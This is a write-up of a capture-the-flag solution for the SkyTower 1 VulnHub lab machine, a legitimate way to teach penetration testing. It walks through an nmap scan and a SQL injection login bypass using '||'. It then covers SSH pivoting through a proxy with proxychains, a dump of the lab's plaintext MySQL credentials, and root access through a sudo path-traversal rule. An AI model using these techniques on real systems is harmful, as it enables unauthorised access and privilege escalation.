Source: https://www.vulnhub.com/entry/skytower-1,96/
Difficulty: Medium
Target: 10.0.0.30

![image](https://user-images.githubusercontent.com/76552238/157845805-162aa64e-6e53-4123-9e7d-059f7d1c857a.png)

## NMAP

    nmap -sS -A -T4 -p- 10.0.0.30

![image](https://user-images.githubusercontent.com/76552238/157846211-9dcbe2be-3b51-4d9d-8237-c177e16f1c13.png)

After performing a NMAP scan we see we have 2 open services and one filtered.
My guess is we are going to get credentials from the site on HTTP and redirect our login to ssh from the proxy server.

## HTTP

![image](https://user-images.githubusercontent.com/76552238/157846607-ec4aff07-cf05-40fb-a033-96f5056fcd2e.png)

Going to **http://10.0.0.30** we need to login with an email and password. There are no comments we can find with dev tools. Maybe a sql injection works? 

![image](https://user-images.githubusercontent.com/76552238/157846557-68f4bff8-36a1-4bdf-9c35-1c7b7597b8f2.png)

Entering ' in the login information we have a SQL syntax error.
Trying 'or 1=1# doesn't seem to work, by what the error displayed seems that "or" is being ignored. 

![image](https://user-images.githubusercontent.com/76552238/157847050-f6ced50e-ad55-4b8c-b171-07910c60c787.png)

We can confirm this by entering a random string.

![image](https://user-images.githubusercontent.com/76552238/157847363-df5a3e84-431f-41b2-9ace-7c692cbf7002.png)

![image](https://user-images.githubusercontent.com/76552238/157847195-c44485f6-afee-4e64-95d9-15891b81bd31.png)

Let's try using "||" instead of "or".

![image](https://user-images.githubusercontent.com/76552238/157847467-e865efc1-4131-4851-9b83-6c9e26db2021.png)

And it works!! We get this message.

![image](https://user-images.githubusercontent.com/76552238/157847516-19955fba-2547-4ae6-846b-17617aa1f90a.png)

Now we can connect via ssh with the credentials for John. Since SSH is filtered (Filtered means that a firewall, filter, or other network obstacle is blocking the port) only the proxy server is allowed login access to the machine, so let's use the 'proxychains' command and add the proxy to our list.
Going to /etc/proxychains.conf we can add "http 10.0.0.32 3128" to our proxy list.

![image](https://user-images.githubusercontent.com/76552238/157847899-83989669-cfed-4f2e-91b1-fc4418d44d98.png)

    proxychains ssh john@10.0.0.30

![image](https://user-images.githubusercontent.com/76552238/157848148-a1a2f0fc-3095-439d-975c-bbe103c31f36.png)

After logging to the machine we are immediately logged out. Maybe starting a shell will work.

     proxychains ssh john@10.0.0.30 /bin/sh

![image](https://user-images.githubusercontent.com/76552238/157848479-b5007924-a3dd-4415-902a-756efe1c38e3.png)

And it works.

I searched on Google and found that the '.bashrc' and '.bash_logout' files are responsible for actions on login, so we can delete them and see if we can login normally.

![image](https://user-images.githubusercontent.com/76552238/157848664-bd5ab785-8ea9-474e-9c87-690a28c2a506.png)

     proxychains ssh john@10.0.0.30

![image](https://user-images.githubusercontent.com/76552238/157848736-d18123a8-c7c2-452f-a21a-97d8ddd5a31b.png)

Going to the /home folder we find 2 more users.

![image](https://user-images.githubusercontent.com/76552238/157848923-5d3ef7cd-87c7-43a6-b4e8-c45e074ddb58.png)

I used 'sudo -l' to see if we have any sudo permissions but we don't, there are also no SUID files we can exploit.

Going to /var/www we can read the login.php page and find credentials for the user 'root' on mysql.

![image](https://user-images.githubusercontent.com/76552238/157849212-b804eb2a-72b4-446d-8cc0-84a8a425a596.png)

![image](https://user-images.githubusercontent.com/76552238/157849807-e39d8963-6744-4b21-a491-cbd8d97860ad.png)

    mysql> show databases;
    +--------------------+
    | Database           |
    +--------------------+
    | information_schema |
    | SkyTech            |
    | mysql              |
    | performance_schema |
    +--------------------+

    mysql> use SkyTech
    Database changed

    mysql> show tables;
    +-------------------+
    | Tables_in_SkyTech |
    +-------------------+
    | login             |
    +-------------------+

    mysql> select * from login;
    +----+---------------------+--------------+
    | id | email               | password     |
    +----+---------------------+--------------+
    |  1 | john@skytech.com    | hereisjohn   |
    |  2 | sara@skytech.com    | ihatethisjob |
    |  3 | william@skytech.com | senseable    |
    +----+---------------------+--------------+

Trying to log into the user 'sara' we once again need to delete the .bashrc and .bash_logout files.

    sudo -l

![image](https://user-images.githubusercontent.com/76552238/157850699-a5b2f3e8-3637-4142-82b2-5775f9d8b390.png)

We can use the "cat" and "ls" command as root only from the /accounts directory.

    sudo ls /accounts/../root

![image](https://user-images.githubusercontent.com/76552238/157850969-7520dc88-0146-42be-8a67-cda97778aad9.png)

    sudo cat /accounts/../root/flag.txt

![image](https://user-images.githubusercontent.com/76552238/157851077-0c4f1f7e-eaa6-44df-90af-44fbb1417392.png)

Nice! we now have found the flag.txt and the password for the root user, we can now switch to the root user to finish the machine.

![image](https://user-images.githubusercontent.com/76552238/157851227-5e4364b2-e6a8-4417-a579-1920189c0bd4.png)
